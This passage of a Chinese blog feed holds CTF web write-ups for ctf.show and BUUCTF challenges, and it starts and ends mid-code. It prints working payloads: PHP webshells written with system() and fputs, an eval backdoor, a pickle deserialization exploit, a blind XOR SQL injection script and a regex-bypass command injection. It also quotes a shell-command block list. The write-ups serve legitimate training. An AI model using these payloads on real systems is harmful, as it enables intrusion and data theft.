/proc/&quot;);</code> 查看正在运行的进程</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201291210025.png" alt="image-20220129121033949"></p><p>好吧经过实践这个思路不行,这里 &#x2F;proc&#x2F; 目录下内容所属用户和组都是root,而提供服务的是www-data，自己写的小脚本先贴在这儿</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> sleep<br><span class="hljs-keyword">from</span> unittest <span class="hljs-keyword">import</span> result<br><span class="hljs-keyword">import</span> requests<br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> [<span class="hljs-number">1</span>,<span class="hljs-number">114</span>,<span class="hljs-number">115</span>,<span class="hljs-number">116</span>,<span class="hljs-number">117</span>,<span class="hljs-number">118</span>,<span class="hljs-number">119</span>,<span class="hljs-number">120</span>,<span class="hljs-number">130</span>,<span class="hljs-number">7</span>,<span class="hljs-number">76</span>]:<br><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">10</span>):<br>        url=<span class="hljs-string">&quot;http://0f8360bf-70b5-485e-a69a-0889ce967e3c.challenge.ctf.show/?f=system(&#x27;nl /proc/%d/fd/%d&#x27;);&quot;</span> %(i,j)<br>        <br>        url=url.<span class="hljs-built_in">format</span>(i,j)<br>        r=requests.get(url=url,)<br>        sleep(<span class="hljs-number">0.5</span>)<br>        result=r.text+url+<span class="hljs-string">&#x27;\n&#x27;</span><br>        output=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;output.txt&quot;</span>,<span class="hljs-string">&quot;a+&quot;</span>)<br>        output.write(result)<br>        <span class="hljs-built_in">print</span>(r)<br>        output.close()<br><br></code></pre></td></tr></table></figure><h2 id="写马"><a href="#写马" class="headerlink" title="写马"></a>写马</h2><h3 id="系统命令写马"><a href="#系统命令写马" class="headerlink" title="系统命令写马"></a>系统命令写马</h3><p><code>?f=system(&quot;echo &#39;\n&lt;?php eval(\$_POST[1]);?&gt;&#39;  &gt; 2.php&quot;);</code></p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201291205578.png" alt="image-20220129120539506"></p><p>这题正好就是secret 一般也就是  secret hint这种，然后直接cat 查看源码即可</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201291206561.png" alt="image-20220129120625494"></p><h3 id="PHP函数写马"><a href="#PHP函数写马" class="headerlink" title="PHP函数写马"></a>PHP函数写马</h3><p><code>?f=fputs(fopen(&#39;cmd.php&#39;,&#39;w&#39;),&quot;&lt;?php @eval(\$_POST[cmd])?&gt;&quot;);</code></p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201291507879.png" alt="image-20220129120824029"></p><p>然后就和上面一样</p><h2 id="php-amp-phpinfo解法"><a href="#php-amp-phpinfo解法" class="headerlink" title="php&amp;phpinfo解法"></a>php&amp;phpinfo解法</h2><p><strong>php -i</strong></p><p>这条命令等同于phpinfo(); 因此getshell之后可以用它来看phpinfo的信息</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201291456624.png" alt="image-20220129145606559"></p><p><strong>phpinfo</strong></p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201291456306.png" alt="image-20220129145636243"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="CTF" scheme="https://d3n13d.github.io/categories/CTF/"/>
    
    
    <category term="Web" scheme="https://d3n13d.github.io/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>BUUCTF_web_第三页wp分享</title>
    <link href="https://d3n13d.github.io/2022/01/28/BUUCTF-web-%E7%AC%AC%E4%B8%89%E9%A1%B5wp%E5%88%86%E4%BA%AB/"/>
    <id>https://d3n13d.github.io/2022/01/28/BUUCTF-web-%E7%AC%AC%E4%B8%89%E9%A1%B5wp%E5%88%86%E4%BA%AB/</id>
    <published>2022-01-28T14:27:48.000Z</published>
    <updated>2022-02-08T16:13:49.139Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="NCTF2019-True-XML-cookbook"><a href="#NCTF2019-True-XML-cookbook" class="headerlink" title="[NCTF2019]True XML cookbook"></a>[NCTF2019]True XML cookbook</h2><p>一眼xxe 大概会存在 <code>&lt;a&gt;1&lt;/a&gt;&lt;b&gt;2&lt;/b&gt;</code> 这样的字段</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201191818297.png" alt="image-20220119181833147"></p><p>发现可以读取文件，但是没法读取 &#x2F;flag</p><p>然后读取 <code>/proc/net/arp</code> </p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201191825675.png" alt="image-20220119182518576"></p><p>读取到一个内网ip尝试进行内网主机探活</p><p>…没弄出来，但是以前做出来过贴个图假装自己做出来了</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201191851452.png" alt="image-20220119185119404"></p><h2 id="MRCTF2020-套娃"><a href="#MRCTF2020-套娃" class="headerlink" title="[MRCTF2020]套娃"></a>[MRCTF2020]套娃</h2><p>首页php源码</p><figure class="highlight php"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><pre><code class="hljs php">&lt;!--<br><span class="hljs-comment">//1st</span><br><span class="hljs-variable">$query</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>];   <span class="hljs-comment">//传参字符串</span><br><br> <span class="hljs-keyword">if</span>( substr_count(<span class="hljs-variable">$query</span>, <span class="hljs-string">&#x27;_&#x27;</span>) !== <span class="hljs-number">0</span> || substr_count(<span class="hljs-variable">$query</span>, <span class="hljs-string">&#x27;%5f&#x27;</span>) != <span class="hljs-number">0</span> )&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Y0u are So cutE!&#x27;</span>);<br>&#125;<br> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b_u_p_t&#x27;</span>] !== <span class="hljs-string">&#x27;23333&#x27;</span> &amp;&amp; preg_match(<span class="hljs-string">&#x27;/^23333$/&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b_u_p_t&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you are going to the next ~&quot;</span>;<br>&#125;<br>!--&gt;<br><br></code></pre></td></tr></table></figure><p>php经典特性了 . [ 可以被解析为下划线。第二个if可以加一个%0a </p><p>有 ?b.u.p.t&#x3D;23333%0a</p><p>第二关提示本地访问，这里给弄上 client-ip:127.0.0.1 这里因为xff被ban了，前段时间刚好看了看php获取ip，remote-addr没准也行</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201191928432.png" alt="image-20220119192836325"></p><p>然后给出了一段branckfuck还是jsfuck我记不太清了，瞎试试 oh，jsfuck</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201191930230.png" alt="image-20220119193046181"></p><p>这里有一点不太明白为什么我burp里加上了POST数据没成功 但是在浏览器里成功了…</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>); <br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;takeip.php&#x27;</span>;<br>ini_set(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;.&#x27;</span>); <br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;Merak&#x27;</span>]))&#123; <br>    highlight_file(<span class="hljs-keyword">__FILE__</span>); <br>    <span class="hljs-keyword">die</span>(); <br>&#125; <br><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">change</span>(<span class="hljs-params"><span class="hljs-variable">$v</span></span>)</span>&#123; <br>    <span class="hljs-variable">$v</span> = base64_decode(<span class="hljs-variable">$v</span>); <br>    <span class="hljs-variable">$re</span> = <span class="hljs-string">&#x27;&#x27;</span>; <br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;strlen(<span class="hljs-variable">$v</span>);<span class="hljs-variable">$i</span>++)&#123; <br>        <span class="hljs-variable">$re</span> .= chr ( ord (<span class="hljs-variable">$v</span>[<span class="hljs-variable">$i</span>]) + <span class="hljs-variable">$i</span>*<span class="hljs-number">2</span> ); <br>    &#125; <br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$re</span>; <br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Local access only!&#x27;</span>.<span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>;<br><span class="hljs-variable">$ip</span> = getIp();<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$ip</span>!=<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>)<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Sorry,you don&#x27;t have permission!  Your ip is :&quot;</span>.<span class="hljs-variable">$ip</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$ip</span> === <span class="hljs-string">&#x27;127.0.0.1&#x27;</span> &amp;&amp; file_get_contents(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;2333&#x27;</span>]) === <span class="hljs-string">&#x27;todat is a happy day&#x27;</span> )&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Your REQUEST is:&quot;</span>.change(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]);<br><span class="hljs-keyword">echo</span> file_get_contents(change(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])); &#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>目的是执行到27行，我们需要满足</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$ip</span> === <span class="hljs-string">&#x27;127.0.0.1&#x27;</span> &amp;&amp; file_get_contents(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;2333&#x27;</span>]) === <span class="hljs-string">&#x27;todat is a happy day&#x27;</span> )  <span class="hljs-comment">//client-ip:127.0.0.1 + phpdata为协议</span><br>    ...<br>    change(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]) <span class="hljs-comment">//读取内容是flag.php </span><br></code></pre></td></tr></table></figure><p>反着搞一下change函数</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201191954768.png" alt="image-20220119195433701"></p><p>别问我为什么vscode写代码要在terminal里面跑，有个弱智游戏给我注册表改了🤦‍♂️就很难在vscode上跑代码</p><p>最后构造如下http数据包即可</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/secrettw.php?2333=data:text/plain,todat%20is%20a%20happy%20day&amp;file=ZmpdYSZmXGI=</span> <span class="hljs-meta">HTTP/1.1</span><br>...<br>client-ip:127.0.0.1<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br></code></pre></td></tr></table></figure><h2 id="极客大挑战-2019-RCE-ME"><a href="#极客大挑战-2019-RCE-ME" class="headerlink" title="[极客大挑战 2019]RCE ME"></a>[极客大挑战 2019]RCE ME</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>]))&#123;<br>            <span class="hljs-variable">$code</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>];<br>                    <span class="hljs-keyword">if</span>(strlen(<span class="hljs-variable">$code</span>)&gt;<span class="hljs-number">40</span>)&#123;<br>                                        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;This is too Long.&quot;</span>);<br>                                                &#125;<br>                    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/[A-Za-z0-9]+/&quot;</span>,<span class="hljs-variable">$code</span>))&#123;<br>                                        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;NO.&quot;</span>);<br>                                                &#125;<br>                    @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$code</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>            highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><br><span class="hljs-comment">// <span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure><p>无字母无数字shell，这里就是取反就行了</p><p>我尝试构造 <code>system(&#39;cat /*&#39;)</code> 但是没有结果 oh 原来是被ban了</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201192017105.png" alt="image-20220119201731043"></p><p>构建一个🐎 <code>assert(eval($_POST[1]))</code></p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201192018089.png" alt="image-20220119201801977"></p><p>成功执行</p><p>之后用蚁剑连接发现很多内容读取不了，大概是因为disable_function禁用的函数太多了？</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201192021868.png" alt="image-20220119202132814"></p><p>用蚁剑的插件 </p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201192023147.png" alt="image-20220119202345087"></p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201192023016.png" alt="image-20220119202305970"></p><h2 id="BSidesCF-2019-Kookie"><a href="#BSidesCF-2019-Kookie" class="headerlink" title="[BSidesCF 2019]Kookie"></a>[BSidesCF 2019]Kookie</h2><p>阿这阿这</p><p>没憋出来，但是看别人wp，就在http数据包添加 <code>Cookie: username=admin</code> 就行</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201192028004.png" alt="image-20220119202827945"></p><h2 id="CISCN2019-华北赛区-Day1-Web2-ikun"><a href="#CISCN2019-华北赛区-Day1-Web2-ikun" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web2]ikun"></a>[CISCN2019 华北赛区 Day1 Web2]ikun</h2><p>找那个钱数的页面</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>url=<span class="hljs-string">&quot;http://0faf2455-bd00-4dbc-bda1-46e8fb482dd4.node4.buuoj.cn:81/shop?page=&quot;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>,<span class="hljs-number">2000</span>,<span class="hljs-number">1</span>):<br>    res=requests.get(url+<span class="hljs-built_in">str</span>(i))<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;lv6.png&#x27;</span> <span class="hljs-keyword">in</span> res.text:<br>        <span class="hljs-built_in">print</span>(i)<br>        <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><p>这个购买的话提醒我去登录 那就去弄一个账户</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201282219868.png" alt="image-20220119212823902"></p><p>账户余额 1000 显然够不上需要的金额</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201192130119.png" alt="image-20220119213016047"></p><p>发现有个jwt，能不能替换成admin的然后直接买这个产品？</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201192137846.png" alt="image-20220119213709772"></p><p>有加密，用jwtcrack跑一下</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201192150019.png" alt="image-20220119215049957"></p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201192152020.png" alt="image-20220119215203952"></p><p>替换箭头内内容为自己想要的内容</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201192154115.png" alt="image-20220119215432035"></p><p>改掉原先的jwt，然后刷新，可以看到我们已经是admin1了 查看一下hint</p><p>解码结果：这网站不仅可以以薅羊毛，我还留了个后门，就藏在lv6里 不是这个地方不知道大家哪里的获得源码我一直也没看懂</p><p>在 &#x2F;b1g_m4mber 这里提示有<a href="http://www.zip的源码泄露/">www.zip的源码泄露</a></p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201192219375.png" alt="image-20220119221907308"></p><p>查看源码，搜搜loads 这个pickl不仅在题目上体现了，在数据包也有所以</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201192227727.png" alt="image-20220119222742651"></p><p>然后构建exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> urllib<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">payload</span>(<span class="hljs-params"><span class="hljs-built_in">object</span></span>):</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__reduce__</span>(<span class="hljs-params">self</span>):</span><br>       <span class="hljs-keyword">return</span> (<span class="hljs-built_in">eval</span>, (<span class="hljs-string">&quot;open(&#x27;/flag.txt&#x27;,&#x27;r&#x27;).read()&quot;</span>,))<br><br>a = pickle.dumps(payload())<br>a = urllib.quote(a)<br><span class="hljs-built_in">print</span> a<br><span class="hljs-comment">#c__builtin__%0Aeval%0Ap0%0A%28S%22open%28%27/flag.txt%27%2C%27r%27%29.read%28%29%22%0Ap1%0Atp2%0ARp3%0A.</span><br></code></pre></td></tr></table></figure><p>然后替换post上去的become变量</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201192234014.png" alt="image-20220119223422932"></p><h2 id="WUSTCTF2020-颜值成绩查询"><a href="#WUSTCTF2020-颜值成绩查询" class="headerlink" title="[WUSTCTF2020]颜值成绩查询"></a>[WUSTCTF2020]颜值成绩查询</h2><p>可以可以异或注入，直接嫖了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> sleep<br><span class="hljs-keyword">import</span> requests<br><br>url= <span class="hljs-string">&#x27;http://3d16e7a7-6339-454c-9fd4-a9b28f29b4f5.node4.buuoj.cn:81/&#x27;</span><br><br>database =<span class="hljs-string">&quot;&quot;</span><br><br>payload1 = <span class="hljs-string">&quot;?stunum=1^(ascii(substr((select(database())),&#123;&#125;,1))&gt;&#123;&#125;)^1&quot;</span> <span class="hljs-comment">#库名为ctf</span><br>payload2 = <span class="hljs-string">&quot;?stunum=1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=&#x27;ctf&#x27;)),&#123;&#125;,1))&gt;&#123;&#125;)^1&quot;</span><span class="hljs-comment">#表名为flag,score</span><br>payload3 =<span class="hljs-string">&quot;?stunum=1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;flag&#x27;)),&#123;&#125;,1))&gt;&#123;&#125;)^1&quot;</span> <span class="hljs-comment">#列名为flag,value</span><br>payload4 = <span class="hljs-string">&quot;?stunum=1^(ascii(substr((select(group_concat(value))from(ctf.flag)),&#123;&#125;,1))&gt;&#123;&#125;)^1&quot;</span> <span class="hljs-comment">#</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">10000</span>):<br>    low = <span class="hljs-number">32</span><br>    high = <span class="hljs-number">128</span><br>    mid =(low + high) // <span class="hljs-number">2</span><br>    <span class="hljs-keyword">while</span>(low &lt; high):<br>        <span class="hljs-comment"># payload = payload1.format(i,mid)  #查库名</span><br>        <span class="hljs-comment"># payload = payload2.format(i,mid)  #查表名</span><br>        <span class="hljs-comment"># payload = payload3.format(i,mid)  #查列名</span><br>        payload = payload4.<span class="hljs-built_in">format</span>(i,mid) <span class="hljs-comment">#查flag</span><br><br>        new_url = url + payload<br>        r = requests.get(new_url)<br>        <span class="hljs-built_in">print</span>(new_url)<br>        sleep(<span class="hljs-number">0.1</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Hi admin, your score is: 100&quot;</span> <span class="hljs-keyword">in</span> r.text:<br>            low = mid + <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            high = mid<br>        mid = (low + high) //<span class="hljs-number">2</span><br>    <span class="hljs-keyword">if</span> (mid == <span class="hljs-number">32</span> <span class="hljs-keyword">or</span> mid == <span class="hljs-number">132</span>):<br>        <span class="hljs-keyword">break</span><br>    database +=<span class="hljs-built_in">chr</span>(mid)<br>    <span class="hljs-built_in">print</span>(database)<br><br><span class="hljs-built_in">print</span>(database)   <span class="hljs-comment"># 来源https://blog.csdn.net/SopRomeo/article/details/106148254</span><br><span class="hljs-comment">#记得加sleep嗷 要不flag很可能是错的</span><br></code></pre></td></tr></table></figure><h2 id="FBCTF2019-RCEService"><a href="#FBCTF2019-RCEService" class="headerlink" title="[FBCTF2019]RCEService"></a>[FBCTF2019]RCEService</h2><p>给了提示Enter command as JSON</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br>    <span class="hljs-attr">&quot;cmd&quot;</span>:<span class="hljs-string">&quot;ls&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>这样就可以执行命令，这里封了好多命令没做下去，然后网上找到了源码可能是比赛的时候给了但是这里没有给出把</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br>putenv(<span class="hljs-string">&#x27;PATH=/home/rceservice/jail&#x27;</span>);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>])) &#123;<br>  <span class="hljs-variable">$json</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br><br>  <span class="hljs-keyword">if</span> (!is_string(<span class="hljs-variable">$json</span>)) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;</span>;<br>  &#125; <span class="hljs-keyword">elseif</span> (preg_match(<span class="hljs-string">&#x27;/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/&#x27;</span>, <span class="hljs-variable">$json</span>)) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;</span>;<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Attempting to run command:&lt;br/&gt;&#x27;</span>;<br>    <span class="hljs-variable">$cmd</span> = json_decode(<span class="hljs-variable">$json</span>, <span class="hljs-literal">true</span>)[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$cmd</span> !== <span class="hljs-literal">NULL</span>) &#123;<br>      system(<span class="hljs-variable">$cmd</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Invalid input&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br/&gt;&lt;br/&gt;&#x27;</span>;<br>  &#125;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>通过这个源码可以推测当前用户为rceservice &#x2F;home&#x2F;rceservice&#x2F;</p><p>这个preg_match可以用%0a或者最大回溯数绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs payload">?cmd=%0a&#123;&quot;cmd&quot;:&quot;/bin/cat /home/rceservice/flag&quot;%0a&#125;<br></code></pre></td></tr></table></figure><p>PHP為防止DOS，設定了PCRE回溯次數上限,預設為1000000</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-built_in">str</span>=<span class="hljs-string">&#x27;a&#x27;</span>*<span 